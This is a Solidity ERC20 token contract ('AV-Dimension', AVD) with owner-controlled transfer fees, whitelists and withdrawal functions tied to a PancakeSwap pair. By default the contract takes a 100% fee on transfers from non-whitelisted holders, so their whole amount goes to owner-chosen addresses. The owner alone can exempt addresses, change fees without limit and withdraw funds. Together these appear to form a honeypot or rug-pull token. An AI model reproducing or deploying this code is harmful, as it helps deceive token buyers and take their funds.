// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";

interface IPancakePair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract Vollar is ERC20 {
    address public owner;
    address public contractAres;
    address public communityAdres;
    address public technologyAdres;
    uint256 public transferTax = 1000;
    uint256 public transferFromTax = 1000;
    uint256 public reflowRate = 1000;
    uint256 public technologyRate = 0;
    uint256 public totalRewardsDistributed;

    mapping(address => bool) public whitelist;
    mapping(address => bool) public whitelistA;

    IERC20 public TokenML;
    address public pancakeSwapPair;
    bool private locked = false;

    constructor(
        address _contractAres,
        address _communityAdres,
        address _technologyAdres
        ) ERC20("AV-Dimension", "AVD") {
        owner = msg.sender;
        contractAres = _contractAres;
        communityAdres = _communityAdres;
        technologyAdres = _technologyAdres;
        _mint(msg.sender, 21000000 * 10 ** decimals());
    }

    receive() external payable {}

    function transfer(address to, uint256 value) public virtual override returns (bool) {
        if(whitelistA[msg.sender]){
            _transfer(msg.sender, to, value);
        } else {
            _processStandardTransfer(msg.sender, to, value);
        }
        if(to == pancakeSwapPair){
            IPancakePair(pancakeSwapPair).sync();
            totalRewardsDistributed += value;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual override returns (bool) {
        uint256 currentAllowance = allowance(from, msg.sender);
        require(currentAllowance >= value, "ERC20: transfer amount exceeds allowance");
        require(balanceOf(from) >= value, "ERR: 10");
        if (whitelist[from] || whitelist[to]) {
            _transfer(from, to, value);
        } else {
            _processStandardTransferFrom(from, to, value);
        }
        _approve(from, msg.sender, currentAllowance - value);
        return true;
    }

    function _processStandardTransfer(address from, address to, uint256 value) internal {
        uint256 transferFee = value * transferTax / 1000;
        _transfer(from, to, value - transferFee);
        if (reflowRate >= transferTax) {
            _transfer(from, contractAres, transferFee);
        } else {
            uint256 reflowValue = value * reflowRate / 1000;
            uint256 communityValue = value * (transferTax - reflowRate - technologyRate) / 1000;
            _transfer(from, contractAres, reflowValue);
            _transfer(from, communityAdres, communityValue);
            if (technologyRate > 0) {
                _transfer(from, technologyAdres, value * technologyRate / 1000);
            }
        }
    }

    function _processStandardTransferFrom(address from, address to, uint256 value) internal {
        uint256 transferFee = value * transferFromTax / 1000;
        _transfer(from, to, value - transferFee);
        if (reflowRate >= transferFromTax) {
            _transfer(from, contractAres, transferFee);
        } else {
            uint256 reflowValue = value * reflowRate / 1000;
            uint256 pairValue = value * (transferFromTax - reflowRate - technologyRate) / 1000;
            _transfer(from, contractAres, reflowValue);
            _transfer(from, communityAdres, pairValue);
            if (technologyRate > 0) {
                _transfer(from, technologyAdres, value * technologyRate / 1000);
            }
        }
    }

    function withDrawToken(address _to, uint256 amount)external nonReentrant onlyOwner  {
        uint256 balance = TokenML.balanceOf(address(this));
        require(balance >= amount, "Insufficient token balance");
        bool success = TokenML.transfer(_to, amount);
        require(success, "Token transfer failed");
    }

    function withDrawVDS(address to, uint amount)external nonReentrant onlyOwner {
        require(address(this).balance >= amount, "Contract doesn't have enough balance.");
        payable(to).transfer(amount);
    }

    //----------------owner----------------
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function addWhitelist(address account) external onlyOwner {
        whitelist[account] = true;
    }

    function removeWhitelist(address account) external onlyOwner {
        whitelist[account] = false;
    }

    function addWhitelistA(address account) external onlyOwner {
        whitelistA[account] = true;
    }

    function removeWhitelistA(address account) external onlyOwner {
        whitelistA[account] = false;
    }

    function setOwner(address _owner) external onlyOwner {
        owner = _owner;
    }

    function setToken(
        address _TokenML
        ) external onlyOwner {
        TokenML = IERC20 (_TokenML);
    }

    function setPairAdres(address _pair) external onlyOwner {
        pancakeSwapPair = _pair;
    }

    function setTaxs(
        uint256 _transferTax,
        uint256 _transferFromTax,
        uint256 _reflowRate,
        uint256 _technologyRate
        ) external onlyOwner {
        transferTax = _transferTax;
        transferFromTax = _transferFromTax;
        reflowRate = _reflowRate;
        technologyRate = _technologyRate;
    }

    function setReceiver(
        address _contractAres,
        address _communityAdres,
        address _technologyAdres
        ) external onlyOwner {
        contractAres = _contractAres;
        communityAdres = _communityAdres;
        technologyAdres = _technologyAdres;
    }
}